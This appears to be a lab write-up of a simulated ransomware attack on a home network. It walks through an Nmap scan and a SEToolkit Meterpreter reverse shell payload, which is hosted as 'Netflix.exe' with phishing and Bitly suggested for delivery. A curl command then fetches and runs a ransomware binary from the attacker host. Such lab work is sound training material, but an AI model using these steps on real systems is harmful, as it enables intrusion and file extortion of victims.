    Ransomeware Simulation Documentation

    ****Deskptop Required. Mobile MediaQueries Errors ****




    Brief Overview

    This project was designed to demonstrate how attackers carry out a ransomeware attack with the aid of a reverse shell connection. The first step is to identify the IP address of the Kali machine to understand the subnet of the LAN. With this information, we can run an Nmap scan. In this setup, the LAN IP range is 192.168.1.0/24, so the Nmap command will be:

    nmap -sV 192.168.1.0/24



    This Nmap scan will identify all endpoints on the network, collecting details such as IP addresses, operating systems, open ports, and the version of services running. Using this, we can locate the Windows machine (the target) based on services commonly associated with Windows systems.

    we will use the Social Engineering Toolkit (SEToolkit) to create the payload. Start by launching setoolkit in terminal, then select Option 1 for Social Engineering, Option 4 to create a payload and listener, and Option 2 for Windows Reverse_TCP Meterpreter. Configure the payload by entering the IP address of your Kali machine and choosing a port below 1000, such as 88, to simplify the setup.

    To host the payload for easy access, first check the status of the Apache2 server with

    service apache2 status



    and ensure it’s off with service apache2 stop. Copy the payload file to the Apache web directory with cp /root/.set/payload.exe /var/www/html/Netflix.exe, then start the server using service apache2 start and confirm it’s running with another status check. With the Apache2 server active, files can now be accessed and shared over the network by users on the same LAN.

    To access the hosted payload, you can use methods like shortening the download link with Bitly or embedding it in a phishing email as a .ps1 script, .exe file, or hidden within a PDF. For this project, we’ll download the payload manually by navigating to

    192.168.1.102/Netflix.exe


    on the Windows machine, confirming any security warnings, and running the executable.

    Once the payload is executed, a session opens in Meterpreter, allowing the attacker to connect using sessions -i 1. With shell access, the ransomware attack begins by downloading the payload via

    curl -O 192.168.1.102/CashCat.exe


    and executing it with start CashCat.exe. This renames files with an unusable extension (e.g., .porno), rendering them inaccessible. To restore access, entering the decryption key 123456789 reverts the files to their original names. This demonstration is for educational purposes only, focusing on ethical hacking practices and showcasing cybersecurity tools and techniques.
